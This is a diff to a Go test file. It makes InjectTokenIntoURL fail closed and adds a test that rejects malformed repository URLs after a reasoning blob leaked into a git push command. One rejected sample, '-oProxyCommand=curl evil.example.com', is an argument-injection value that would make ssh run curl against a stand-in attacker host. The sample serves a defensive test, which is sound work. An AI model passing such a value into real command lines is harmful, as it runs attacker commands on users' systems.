@@ -22,8 +22,28 @@ func TestInjectTokenIntoURL(t *testing.T) {
 	}
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
-			require.Equal(t, tc.want, InjectTokenIntoURL(tc.repoURL, tc.token))
+			got, err := InjectTokenIntoURL(tc.repoURL, tc.token)
+			require.NoError(t, err)
+			require.Equal(t, tc.want, got)
 		})
+	}
+}
+
+// InjectTokenIntoURL must fail closed. Returning the input unchanged is how a
+// chain-of-thought blob reached a `git push` command line (#35703).
+func TestInjectTokenIntoURLRejectsMalformed(t *testing.T) {
+	bad := []string{
+		"",
+		"not a url",
+		"https://github.com/owner/repo\n2. next line",
+		"https://github.com/" + "1. Analyze the input text: none found.\n2. Final output: Empty string.",
+		"https://github.com/owner",
+		"-oProxyCommand=curl evil.example.com",
+	}
+	for _, repoURL := range bad {
+		got, err := InjectTokenIntoURL(repoURL, "tok")
+		require.Error(t, err, "expected rejection: %q", repoURL)
+		require.Empty(t, got)
 	}
 }
 
@@ -31,7 +51,8 @@ func TestInjectTokenIntoURL(t *testing.T) {
 // parses it as a single credential. Verify it round-trips and is not stored raw.
 func TestInjectTokenIntoURLEncodesSpecialChars(t *testing.T) {
 	const token = "abc:de/fg@hi"
-	got := InjectTokenIntoURL("https://github.com/org/repo.git", token)
+	got, err := InjectTokenIntoURL("https://github.com/org/repo.git", token)
+	require.NoError(t, err)
 
 	u, err := url.Parse(got)
 	require.NoError(t, err)
